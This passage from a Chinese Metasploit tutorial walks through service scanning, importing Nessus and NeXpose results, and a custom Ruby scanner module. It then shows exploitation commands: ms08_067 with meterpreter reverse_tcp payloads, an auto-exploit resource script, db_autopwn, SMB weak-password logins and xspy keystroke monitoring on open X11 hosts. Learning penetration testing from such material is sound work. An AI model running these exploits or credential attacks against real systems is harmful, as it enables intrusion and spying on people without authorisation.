<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search postscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use scanner/postscan/syn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5特定扫描">5、特定扫描：<a href="#5特定扫描" class="hash-link" aria-label="5、特定扫描：的直接链接" title="5、特定扫描：的直接链接">​</a></h3>
<p>smb_version模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,os_flavor</span><br></span></code></pre></div></div>
<p>查找mssql主机：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>SSH服务器扫描：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ssh/ssh_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>FTP主机扫描：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>扫描FTP匿名登录：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use auxiliary/scanner/ftp/anonymos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>扫描SNMP主机：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/snmp/snmp_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6编写自定义扫描模块">6、编写自定义扫描模块：<a href="#6编写自定义扫描模块" class="hash-link" aria-label="6、编写自定义扫描模块：的直接链接" title="6、编写自定义扫描模块：的直接链接">​</a></h3>
<p>MSF框架提供对其所有exploit和method的访问，支持代理，SSL，报告生成，线程， 使用Ruby语言。</p>
<p>例子：一个简单的自定义扫描模块</p>
<div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#Metasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::Tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf:Auxiliary::Scanner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Name’ =&gt; ‘My custom TCP scan’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Version’ =&gt; ‘$Revision: 1$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Description’ =&gt; ‘My quick scanner’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Author’ =&gt; ‘Your name here’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘License’ =&gt; ‘MSF_LICENSE’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Opt::RPORT(12345)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run_host(ip)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    connect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sock.puts(‘HELLO SERVER’)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data = sock.recv(1024)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print_status(“Received: #{data} from #{ip}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disconnect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre></div></div>
<p>测试：将模块保存到modules/auxiliary/scanner/目录下面,命名为simple_tcp.rb，注意保存的位置很重要。</p>
<p>使用nc监听一个端口测试这个模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo “Hello Metasploit” &gt; banner.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nc –lvnp 12345 &lt; banner.txt</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/simple_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Received: Hello Metasploit from 192.168.1.111</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="四基本漏洞扫描">四．基本漏洞扫描<a href="#四基本漏洞扫描" class="hash-link" aria-label="四．基本漏洞扫描的直接链接" title="四．基本漏洞扫描的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-基本扫描">1 基本扫描<a href="#1-基本扫描" class="hash-link" aria-label="1 基本扫描的直接链接" title="1 基本扫描的直接链接">​</a></h3>
<p>1、使用nc与目标端口通信，获取目标端口的信息：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET HTTP 1/1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server: Microsoft-IIS/5.1</span><br></span></code></pre></div></div>
<p>1: 还有一个功能与nc类似的工具Ncat，产自nmap社区，可实现相同功能：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ncat -C 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET / HTTP/1.0</span><br></span></code></pre></div></div>
<p>2：题外：ncat还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l --chat   其他客户端：ncat chatserver</p>
<p>3：ncat还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：
服务器（server.example.com）上：<code>ncat -l --keep-open 80 --output caidao.log &gt; /dev/null</code>  然后使用菜刀连接<a href="http://server.example.com/nc.php" target="_blank" rel="noopener noreferrer">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，--output换为--hex-dump就可以了。</p>
<p>4：其实与nc功能类似的工具在bt5里面还有很  多，比如还有一个sbd：</p>
<p>监听：<code>sbd -l -p 12345</code></p>
<p>连接：<code>sbd 192.168.1.111 12345</code></p>
<p>5：当然也可以用来聊天，与ncat的不同之处在于ncat自动对用户编号user1、user2、...，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：</p>
<p>pc1：<code>sbd -l -p 12345 -P chowner</code></p>
<p>pc2：<code>sbd pc1 12345 -P evil</code></p>
<p>6：其实nc也可以用来聊天的：</p>
<p>pc1：<code>nc -l -p 12345</code></p>
<p>pc2: <code>telnet pc1 12345</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-与nexpose结合扫描">2 与NeXpose结合扫描：<a href="#2-与nexpose结合扫描" class="hash-link" aria-label="2 与NeXpose结合扫描：的直接链接" title="2 与NeXpose结合扫描：的直接链接">​</a></h3>
<p>在nexpose中扫描目标并生成xml格式的报告后，将报告导入到msf：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/host_test.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svvs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre></div></div>
<p>在MSF中运行nexpose：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_destroy postgres:toor@127.0.0.l1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nexpose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect –h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect nexpose:toor@192.168.1.111 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_scan 192.168.1.195</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre></div></div>
<p>（如果你想在bt5里安装nexpose的话建议把bt5硬盘空间多留几十G，这玩意硬盘小了不让装。）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3与nessus结合扫描">3、与nessus结合扫描：<a href="#3与nessus结合扫描" class="hash-link" aria-label="3、与nessus结合扫描：的直接链接" title="3、与nessus结合扫描：的直接链接">​</a></h3>
<p>使用Nessus扫描完成后生成.nessus格式的报告，导入到MSF：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/nessus_report_Host_test.nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre></div></div>
<p>在MSF中使用Nessus：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_connect nessus:toor@192.168.1.111:8834 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_policy_list  #查看存在的扫描规则</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_new 2 bridge_scan 192.168.1.111 #2表示规则的ID号，bridge_scan自定义扫描名称</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_status #查看扫描进行状态</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_list  #查看扫描结果</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_get skjla243-3b5d-*******   #导入报告</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4特殊扫描">4、特殊扫描：<a href="#4特殊扫描" class="hash-link" aria-label="4、特殊扫描：的直接链接" title="4、特殊扫描：的直接链接">​</a></h3>
<p>SMB弱口令:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111-222</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBUser Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>VNC空口令：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>Open X11空口令：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/x11/open_x11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/sniffers/xspy/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./xspy –display 192.168.1.125:0 –delay 100</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5使用autopwn处理扫描结果">5、使用Autopwn处理扫描结果：<a href="#5使用autopwn处理扫描结果" class="hash-link" aria-label="5、使用Autopwn处理扫描结果：的直接链接" title="5、使用Autopwn处理扫描结果：的直接链接">​</a></h3>
<p>autopwn选项：e执行attack   t查看匹配模块   r使用reverse shell作为payload   x基于漏洞筛选模块  p基于端口筛选模块</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /root/nessus.nbe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_autopwn –e –t –r –x –p</span><br></span></code></pre></div></div>
<ul>
<li>-e 针对符合条件的目标加载所有exploit -t显示所有匹配的exploit -r使用反弹shell</li>
<li>-x 基于漏洞筛选模块 -p基于端口筛选模块</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="五基础溢出命令">五．基础溢出命令<a href="#五基础溢出命令" class="hash-link" aria-label="五．基础溢出命令的直接链接" title="五．基础溢出命令的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1基本命令">1、基本命令：<a href="#1基本命令" class="hash-link" aria-label="1、基本命令：的直接链接" title="1、基本命令：的直接链接">​</a></h3>
<p>查看可用溢出模块<code>show exploits</code>
查看辅助模块<code>show auxiliary</code>  包括扫描器，拒绝服务模块，fuzzer工具或其他。
查看可用选项<code>show options</code></p>
<p>加载模块后退出此模块 back</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">back</span><br></span></code></pre></div></div>
<p>搜索模块 search</p>
<p>例子： <code>searh mssql search ms08_067</code></p>
<p>查看当前模块可用的payload： <code>show payloads</code></p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span></code></pre></div></div>
<p>查看可选的目标类型<code>show targets</code>
查看更多信息<code>info</code>
设置一个选项或取消设置 <code>set/unset</code>
设置或取消全局选项 <code>setg/unsetg</code>  例如设置LHOST就可以用setg，避免后面重复设置
保存全局选项的设置 <code>save</code>   当下次启动仍然生效
查看建立的session  <code>sessions –l</code></p>
<p>激活session   <code>sessions –i  num</code>    #num为session编号</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2暴力端口探测">2、暴力端口探测：<a href="#2暴力端口探测" class="hash-link" aria-label="2、暴力端口探测：的直接链接" title="2、暴力端口探测：的直接链接">​</a></h3>
<p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.122</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search ports   #搜索与ports相关模块</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j   #作为后台任务运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –l –v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sesssions –i 1</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3msf脚本文件">3、MSF脚本文件：<a href="#3msf脚本文件" class="hash-link" aria-label="3、MSF脚本文件：的直接链接" title="3、MSF脚本文件：的直接链接">​</a></h3>
<p>为了缩短测试时间可以将msf命令写入一个文件，然后在msf中加载它。</p>
<p>加载方式：msfconsole的resource命令或者msfconsole加上-r选项</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘version’ &gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo ‘load sounds’ &gt;&gt; resource.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole –r resource.rc</span><br></span></code></pre></div></div>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;use exploit/windows/smb/ms08_067_netapi&#x27; &gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set RHOST 192.168.1.133&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set PAYLOAD windows/meterpreter/reverse_tcp&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;set LHOST 192.168.1.111&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;exploit&#x27; &gt;&gt; autoexp.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource autoexp.rc</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="六meterpreter">六．METERPRETER<a href="#六meterpreter" class="hash-link" aria-label="六．METERPRETER的直接链接" title="六．METERPRETER的直接链接"> ​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用meterpreter">1、使用meterpreter<a href="#1使用meterpreter" class="hash-link" aria-label="1、使用meterpreter的直接链接" title="1、使用meterpreter的直接链接">​</a></h3>
<p>当对目标系统进行溢出时，使用meterpreter作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。
例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#假如已经探测到1433（TCP）和1434(UDP)端口（mssql），</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.1/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>至此可获取服务器名称，版本号等信息。</p>
